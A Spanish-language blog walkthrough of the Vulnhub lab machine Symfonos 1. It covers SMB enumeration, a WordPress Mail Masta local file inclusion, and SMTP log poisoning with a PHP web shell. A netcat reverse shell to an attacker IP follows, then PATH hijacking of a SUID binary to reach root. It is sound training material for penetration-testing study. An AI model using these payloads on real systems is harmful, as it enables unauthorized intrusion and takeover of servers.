---
layout: post
title: Symfonos 1 - Walkthrough
date: 2020-04-03 20:44
description: Walkthrough - Symfonos 1
toc: true
comments: true
tags: 
 - OSCP
 - Walkthrough
 - Vulnhub

---

## **Walkthrough de Symfonos 1**
---

## **Links**
[Symfonos 1 en Vulnhub](https://www.vulnhub.com/entry/symfonos-1,322/)



## **Reconocimiento**
---
>**`nmap -T4 -p- 10.0.0.138`**

```console
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-26 12:03 -03
Nmap scan report for 10.0.0.138
Host is up (0.000080s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 08:00:27:49:78:28 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.31 seconds
```

>**`nmap -A -T4 -p 22,25,80,139,445 10.0.0.138 -oA Symfonos_1`**

```console
Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-26 12:04 -03
Nmap scan report for 10.0.0.138
Host is up (0.00014s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 ab:5b:45:a7:05:47:a5:04:45:ca:6f:18:bd:18:03:c2 (RSA)
|   256 a0:5f:40:0a:0a:1f:68:35:3e:f4:54:07:61:9f:c6:4a (ECDSA)
|_  256 bc:31:f5:40:bc:08:58:4b:fb:66:17:ff:84:12:ac:1d (ED25519)
25/tcp  open  smtp        Postfix smtpd
|_smtp-commands: symfonos.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:49:78:28 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Hosts:  symfonos.localdomain, SYMFONOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: SYMFONOS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.5.16-Debian)
|   Computer name: symfonos
|   NetBIOS computer name: SYMFONOS\x00
|   Domain name: \x00
|   FQDN: symfonos
|_  System time: 2020-03-26T10:04:34-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-03-26T15:04:34
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.14 ms 10.0.0.138

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.86 seconds
```

---
### **Protocolo SMB (139)**
---

>**``smbclient //10.0.0.138/anonymous``**

---

```console
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Jun 28 22:14:49 2019
  ..                                  D        0  Fri Jun 28 22:12:15 2019
  attention.txt                       N      154  Fri Jun 28 22:14:49 2019

		19994224 blocks of size 1024. 17304204 blocks available
smb: \> exit
```

---


>**``cat attention.txt``**

---


```console
Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'! 

Next person I find using one of these passwords will be fired!

-Zeus
```
---

lo próximo que hice fue probar de loguearme al share del usuario Helios con alguno de los 3 password que reveló el archivo `attention.txt`, baseball era el password correcto. 

>**``smbclient //10.0.0.138/h3l105 -U helios``**

---

```console
smb: \> dir
  .                                   D        0  Fri Jun 28 21:32:05 2019
  ..                                  D        0  Fri Jun 28 21:37:04 2019
  research.txt                        A      432  Fri Jun 28 21:32:05 2019
  todo.txt                            A       52  Fri Jun 28 21:32:05 2019

		19994224 blocks of size 1024. 17305572 blocks available
smb: \> exit
```
---

>**``cat research.txt``**

---

```console
Helios (also Helius) was the god of the Sun in Greek mythology. He was thought to ride a golden chariot which brought the Sun across the skies each day from the east (Ethiopia) to the west (Hesperides) while at night he did the return journey in leisurely fashion lounging in a golden cup. The god was famously the subject of the Colossus of Rhodes, the giant bronze statue considered one of the Seven Wonders of the Ancient World.
```

---

>**``cat todo.txt``**

---

```console
1. Binge watch Dexter
2. Dance
3. Work on /h3l105
```

---

El archivo todo da la pista sobre un posible sitio en el servidor web. Voy a probar:

Efectivamente, en esa URL existe un WordPress a modo de blog personal.

![img]({{ '/assets/images/Symfonos_1/wordpress_00.png' | relative_url }}){: .center-image }*(Carrozas de Fuego)*



---
### **Protocolo HTTP (80)**
---

Directamente fui a pegarle al WordPress con la herramienta `WpScan`

---


---
>**``wpscan --url http://symfonos.local/h3l105/``**

```console
        __          _______   _____
        \ \        / /  __ \ / ____|
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 3.5.3
          Sponsored by Sucuri - https://sucuri.net
      @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]
[+] URL: http://symfonos.local/h3l105/
[+] Started: Thu Mar 26 12:29:41 2020

Interesting Finding(s):

[+] http://symfonos.local/h3l105/
 | Interesting Entry: Server: Apache/2.4.25 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://symfonos.local/h3l105/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] http://symfonos.local/h3l105/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://symfonos.local/h3l105/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] http://symfonos.local/h3l105/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.2 identified (Insecure, released on 2019-06-18).
 | Detected By: Rss Generator (Passive Detection)
 |  - http://symfonos.local/h3l105/index.php/feed/, <generator>https://wordpress.org/?v=5.2.2</generator>
 |  - http://symfonos.local/h3l105/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.2</generator>
 |
 | [!] 6 vulnerabilities identified:
 |
 | [!] Title: WordPress 5.2.2 - Cross-Site Scripting (XSS) in Stored Comments
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9861
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16218
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |
 | [!] Title: WordPress 5.2.2 - Authenticated Cross-Site Scripting (XSS) in Post Previews
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9862
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16223
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |
 | [!] Title: WordPress 5.2.2 - Potential Open Redirect
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9863
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16220
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/c86ee39ff4c1a79b93c967eb88522f5c09614a28
 |
 | [!] Title: WordPress 5.0-5.2.2 - Authenticated Stored XSS in Shortcode Previews
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9864
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16219
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://fortiguard.com/zeroday/FG-VD-18-165
 |      - https://www.fortinet.com/blog/threat-research/wordpress-core-stored-xss-vulnerability.html
 |
 | [!] Title: WordPress 5.2.2 - Cross-Site Scripting (XSS) in Dashboard
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9865
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16221
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |
 | [!] Title: WordPress <= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation
 |     Fixed in: 5.2.3
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9867
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68

[+] WordPress theme in use: twentynineteen
 | Location: http://symfonos.local/h3l105/wp-content/themes/twentynineteen/
 | Latest Version: 1.4 (up to date)
 | Last Updated: 2019-05-07T00:00:00.000Z
 | Readme: http://symfonos.local/h3l105/wp-content/themes/twentynineteen/readme.txt
 | Style URL: http://symfonos.local/h3l105/wp-content/themes/twentynineteen/style.css?ver=1.4
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Detected By: Css Style (Passive Detection)
 |
 | Version: 1.4 (80% confidence)
 | Detected By: Style (Passive Detection)
 |  - http://symfonos.local/h3l105/wp-content/themes/twentynineteen/style.css?ver=1.4, Match: 'Version: 1.4'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] mail-masta
 | Location: http://symfonos.local/h3l105/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Detected By: Urls In Homepage (Passive Detection)
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: Mail Masta 1.0 - Unauthenticated Local File Inclusion (LFI)
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8609
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10956
 |      - https://www.exploit-db.com/exploits/40290/
 |      - https://cxsecurity.com/issue/WLB-2016080220
 |
 | [!] Title: Mail Masta 1.0 - Multiple SQL Injection
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/8740
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6095
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6096
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6097
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6098
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6570
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6571
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6572
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6573
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6574
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6575
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6576
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6577
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6578
 |      - https://github.com/hamkovic/Mail-Masta-Wordpress-Plugin
 |
 | Version: 1.0 (100% confidence)
 | Detected By: Readme - Stable Tag (Aggressive Detection)
 |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://symfonos.local/h3l105/wp-content/plugins/mail-masta/readme.txt

[+] site-editor
 | Location: http://symfonos.local/h3l105/wp-content/plugins/site-editor/
 | Latest Version: 1.1.1 (up to date)
 | Last Updated: 2017-05-02T23:34:00.000Z
 |
 | Detected By: Urls In Homepage (Passive Detection)
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Site Editor <= 1.1.1 - Local File Inclusion (LFI)
 |     References:
 |      - https://wpvulndb.com/vulnerabilities/9044
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7422
 |      - http://seclists.org/fulldisclosure/2018/Mar/40
 |      - https://github.com/SiteEditor/editor/issues/2
 |
 | Version: 1.1.1 (80% confidence)
 | Detected By: Readme - Stable Tag (Aggressive Detection)
 |  - http://symfonos.local/h3l105/wp-content/plugins/site-editor/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=========================================> (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.


[+] Finished: Thu Mar 26 12:29:47 2020
[+] Requests Done: 53
[+] Cached Requests: 5
[+] Data Sent: 10.425 KB
[+] Data Received: 486.783 KB
[+] Memory used: 194.566 MB
[+] Elapsed time: 00:00:05
```
---

Lo más importante de este resultado es que el sitio tiene un corriendo un plu-in llamado `Mail Masta`. Una búsqueda en `Searchsploit` da como resultado un LFI que voy a probar:

---

>**``searchsploit masta``**

---

```console
----------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                               |  Path
                                                                             | (/usr/share/exploitdb/)
----------------------------------------------------------------------------- ----------------------------------------
WordPress Plugin Mail Masta 1.0 - Local File Inclusion                       | exploits/php/webapps/40290.txt
WordPress Plugin Mail Masta 1.0 - SQL Injection                              | exploits/php/webapps/41438.txt
----------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```
---

En el browser simplemente hay que entrar a la siguiente URL para poder leer archivos del sistema:

---

>**``http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd``**

---

![img]({{ '/assets/images/Symfonos_1/wordpress_01.png' | relative_url }}){: .center-image }*(/etc/passwd)*

---

Logré incluso filtrar la contraseña del `MySQL` aunque no me sirvió de mucho, por eso lo saqué del post. En realidad hay que combinar esta vulnerabilidad con otra llamada [SMTP Log Poisoning](https://liberty-shell.com/sec/2018/05/19/poisoning/) para lograr una shell reversa.


### **Protocolo SMTP**

---
Como bien explica el post linkeado lo que tenemos que ahcer es envíar un correo por linea de comando y en algún momento de la conversación SMTP hay que insertar un código PHP. Ese código va a quedar guardado en el log del servidor SMTP (Postfix) y en el momento que sea accedido desde el browser y explotando la vulnerabilidad e LFI anteriormente encontrar, el servidor web va a parsear el log y ejecutar el código PHP exactamente cómo código PHP y no cómo un archivo de texto plano.

---

>**``telnet symfonos.local 25``**

---

```console
Trying 10.0.0.138...
Connected to 10.0.0.138.
Escape character is '^]'.
helo pepe
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
250 symfonos.localdomain
mail from: helios@symfonos.local
250 2.1.0 Ok
rcpt to: Helios
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
<?php system($_GET['c']); ?>
.
250 2.0.0 Ok: queued as 6A60840AB3
421 4.4.2 symfonos.localdomain Error: timeout exceeded
Connection closed by foreign host.
```

---

Una vez que se logra enviar el correo insertando la linea de PHP: `<?php system($_GET['c']); ?>` hay que ir al browser y tipear la siguente URL:

>``**http://10.0.0.138/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=nc%20-e%20/bin/bash%2010.0.0.131%201234**``

---

Previamente desde la VM atacante hay que abrir una conexión esperando el reverse shell:

---

```console
nc -nlvp 1234
```
---

Si todo salió bien ya tenemos la shell reversa. Para que todo vaya mejor ejecuto:

```python
python -c 'import pty; pty.spawn("/bin/bash")'
```
---

Corriendo el siguiente comando **``find / -perm -u=s -type f 2>/dev/null``** encontré un ejecutable que no es convencional llamado `statuscheck`.
Al ejecutar este binario lo hace con los privilegios de root y si veo el contenido con el comando `strings` se ve que claramente está ejecutando el comando `cURL`:

---

```console
/lib64/ld-linux-x86-64.so.2
libc.so.6
system
__cxa_finalize
__libc_start_main
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
GLIBC_2.2.5
curl -I H
http://lH
ocalhostH
AWAVA
AUATL
[]A\A]A^A_
;*3$"
GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516
```
---

La manera de aporovecharse de todo esto es creando un archivo llamado igual que el comando `curl` dentro del directorio `/tmp` con el contenido `"/bin/sh"` y modificar la variable de entorno `$PATH`. De esta forma lo que se logra es ejecutar el binario `statuscheck` con privilegios de root pero en vez de ir a buscar al comando genuino `curl` primero lo va a ir a buscar dentro de la primera variable de PATH que le declaramos nosotros y que es `/tmp`. Así se ejecunta `/bin/sh` como root:

---


```console
cd /tmp
echo "/bin/sh" > curl
chmod 777 curl
echo $PATH
export PATH=/tmp:$PATH
/opt/statuscheck
```

---


### **Flag**
---
```console
cd /root
ls
proof.txt
cat proof.txt

	Congrats on rooting symfonos:1!

                 \ __
--==/////////////[})))==*
                 / \ '          ,|
                    `\`\      //|                             ,|
                      \ `\  //,/'                           -~ |
   )             _-~~~\  |/ / |'|                       _-~  / ,
  ((            /' )   | \ / /'/                    _-~   _/_-~|
 (((            ;  /`  ' )/ /''                 _ -~     _-~ ,/'
 ) ))           `~~\   `\\/'/|'           __--~~__--\ _-~  _/, 
((( ))            / ~~    \ /~      __--~~  --~~  __/~  _-~ /
 ((\~\           |    )   | '      /        __--~~  \-~~ _-~
    `\(\    __--(   _/    |'\     /     --~~   __--~' _-~ ~|
     (  ((~~   __-~        \~\   /     ___---~~  ~~\~~__--~ 
      ~~\~~~~~~   `\-~      \~\ /           __--~~~'~~/
                   ;\ __.-~  ~-/      ~~~~~__\__---~~ _..--._
                   ;;;;;;;;'  /      ---~~~/_.-----.-~  _.._ ~\     
                  ;;;;;;;'   /      ----~~/         `\,~    `\ \        
                  ;;;;'     (      ---~~/         `:::|       `\\.      
                  |'  _      `----~~~~'      /      `:|        ()))),      
            ______/\/~    |                 /        /         (((((())  
          /~;;.____/;;'  /          ___.---(   `;;;/             )))'`))
         / //  _;______;'------~~~~~    |;;/\    /                ((   ( 
        //  \ \                        /  |  \;;,\                 `   
       (<_    \ \                    /',/-----'  _> 
        \_|     \\_                 //~;~~~~~~~~~ 
                 \_|               (,~~   
                                    \~\
                                     ~~

	Contact me via Twitter @zayotic to give feedback!


```

---


### **Conclusión**

---

Me voy a la cama.

---